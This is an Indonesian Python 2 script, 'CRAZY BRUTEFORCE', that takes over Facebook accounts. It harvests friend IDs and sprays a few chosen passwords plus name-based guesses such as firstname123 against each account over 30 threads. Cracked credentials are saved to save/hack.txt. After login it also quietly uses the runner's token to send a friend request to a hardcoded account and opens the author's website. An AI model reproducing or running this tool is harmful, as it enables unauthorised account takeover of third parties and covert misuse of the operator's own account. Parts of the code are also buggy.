#!/usr/bin/python2.7
import os,sys,time,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

try:
	import requests
except ImportError:
	os.system('python -m pip install requests')

try:
	import mechanize
except ImportError:
	os.system('python -m pip install mechanize')
# Coded : Mohammad Taufiq Hidayat
# Website : www.nagato-offcial23.my.id
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)

# https://fb.me/Tendo.Pain8
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def Mengetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)

logo = ''' { CRAZY BRUTEFORCE } \n'''

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print 'Sedang masuk ' + o,
        sys.stdout.flush()
        time.sleep(1)
# https://fb.me/Tendo.Pain8
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []

def login():
	print logo
	try:
		toket = open('login.txt','r')
		menu()
	except (KeyError, IOError):
		print 'Login with your account first!\n'
		id = raw_input('email : ')
		pwd = raw_input('password :')
		print 'Sedang Masuk...'
	try:
		br.open('https://mbasic.facebook.com/')
	except mechanize.URLError:
		print 'tidak ada koneksi!'
		os.sys.exit(0)
# https://fb.me/Tendo.Pain8
	br._factory.is_html = True
	br.select_form(nr=0)
	br.form['email'] = id
	br.form['pass'] = pwd
	br.submit()
	url = br.geturl()
	if 'save-device' in url:
		try:
			sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
			data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
			x = hashlib.new('md5')
			x.update(sig)
			a = x.hexdigest()
			data.update({'sig': a})
			url = 'https://api.facebook.com/restserver.php'
			r = requests.get(url, params=data)
			z = json.loads(r.text)
			unikers = open('login.txt', 'w')
			unikers.write(z['access_token'])
			unikers.close()
			print 'Login success!'
			requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
			os.system ('xdg-open https://www.nagato-official23.my.id')
			menu()
		except requests.exceptions.ConnectionError:
			print 'Tidak ada koneksi!'
			os.sys.exit(0)
	if 'checkpoint' in url:
		print 'sepertinya akun anda checkpoint / terkena sesi'
		os.system('rm -rf login.txt')
		os.sys.exit(0)
	else:
		print 'Email/password salah!'
		os.system('rm -rf login.txt')
		os.sys.exit(0)

def menu():
	global toket
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print 'Sepertinya anda telah Logout!'
		os.system('rm -rf login.txt')
		os.sys.exit(0)
	os.system('clear')
	print logo
	print '1. Crack From Friendslist'
	print '2. Crack From Public'
	print '00. Exit this program'
	wi()

def wi():
	global cekpoint
	global oks
	a1 = raw_input('choose :')
	if a1 =='1':
		os.system('clear')
		print logo
		print 25* '-'
		r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['data'])

	elif a1 =='2':
		os.system('clear')
		print logo
		print 25* '-'
		idt = raw_input('masukkan id Public :')
		try:
			jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
			op = json.loads(jok.text)
			print '{#} User :' + op['name']
		except KeyError:
			print 'id not found!'
			time.sleep(3)
			menu()

		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])

	print 'id found : '+str(len(id))
	time.sleep(1)
	pw1 = raw_input ('set password :')
	pw2 = raw_input ('set password :')
	pw3 = raw_input ('set password :')
	pw4 = raw_input ('set password :')
	pw5 = raw_input ('set password :')
	print 'Crack berjalan silahkan tunggu'
	print 'Jika tidak ada hasil gunakan mode data / pesawat'
	print 25* '-'

	def main(arg):
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass

		try:
			a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
			b = json.loads(a.text)
			p1 = pw1
			data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			q = json.load(data)
			if 'access_token' in q:
				print '[HACK] '+ user +' | '+ p1
				cek = open('save/hack.txt','a')
				cek.write(user+'|'+p1+'\n')
				cek.close()
				oks.append(user+p1)
			elif 'www.facebook.com' in q['error_msg']:
				print '[CHECK] '+ user +' | '+ p1
				cekpoint.append(user+p1)

			else:
				p2 = pw2
				data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p2 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
				q = json.load(data)
				if 'access_token' in q:
					print '[HACK] '+ user +' | '+ p2
					cek = open('save/hack.txt','a')
					cek.write(user+'|'+p2+'\n')
					cek.close()
					oks.append(user+p2)
				elif 'www.facebook.com' in q['error_msg']:
					print '[CHECK] '+ user +' | '+ p2
					cekpoint.append(user+p2)
					# https://fb.me/Tendo.Pain8
				else:
					p3 = pw3
					data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p3 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
					q = json.load(data)
					if 'access_token' in q:
						print '[HACK] '+ user +' | '+ p3
						cek = open('save/hack.txt','a')
						cek.write(user+'|'+p3+'\n')
						cek.close()
						oks.append(user+p3)
					elif 'www.facebook.com' in q['error_msg']:
						print  '[CHECK] '+ user +' | '+ p3
						cekpoint.append(user+p3)

					else:
						p4 = pw4
						data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p4 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
						q = json.load(data)
						if 'access_token' in q:
							print '[HACK] '+ user +' | '+ p4
							cek = open('save/hack.txt','a')
							cek.write(user+'|'+p4+'\n')
							cek.close()
							oks.append(user+p4)
						elif 'www.facebook.com' in q['error_msg']:
							print  '[CHECK] '+ user +' | '+ p4
							cekpoint.append(user+p4)

						else:
							p5 = pw5
							data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p5 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
							q = json.load(data)
							if 'access_token' in q:
								print '[HACK] '+ user +' | '+ p5
								cek = open('save/hack.txt','a')
								cek.write(user+'|'+p5+'\n')
								cek.close()
								oks.append(user+p5)
							elif 'www.facebook.com' in q['error_msg']:
								print  '[CHECK] '+ user +' | '+ p5
								cekpoint.append(user+p5)
						# https://fb.me/Tendo.Pain8
							else:
								p6 = b['first_name'] + '123'
								data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p6 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
								q = json.load(data)
								if 'access_token' in q:
									print '[HACK] '+ user +' | '+ p6
									cek = open('save/hack.txt','a')
									cek.write(user+'|'+p6+'\n')
									cek.close()
									oks.append(user+p5)
								elif 'www.facebook.com' in q['error_msg']:
									print  '[CHECK] '+ user +' | '+ p6
									cekpoint.append(user+p6)

								else:
									a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
									b = json.load(a.text)
									p7 = b['last_name'] + '123'
									data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p7 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
									q = json.load(data)
									if 'access_token' in q:
										print '[HACK] '+ user +' | '+ p7
										cek = open('save/hack.txt','a')
										cek.write(user+'|'+p7+'\n')
										cek.close()
										oks.append(user+p7)
									elif 'www.facebook.com' in q['error_msg']:
										print '[CHECK] '+ user +' | '+ p7
										cekpoint.append(user+p6)

		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print 25* '-'
	print ' CRACK DONE !' # https://fb.me/Tendo.Pain8
	print ' HACK : '+ str(len(oks))
	print ' CHECK : '+ str(len(cekpoint))
	print ' File save ~> save/hack.txt'
	print 25* '-'
	os.sys.exit(0)

if __name__ == '__main__':
	login()
	menu()
# https://fb.me/Tendo.Pain8
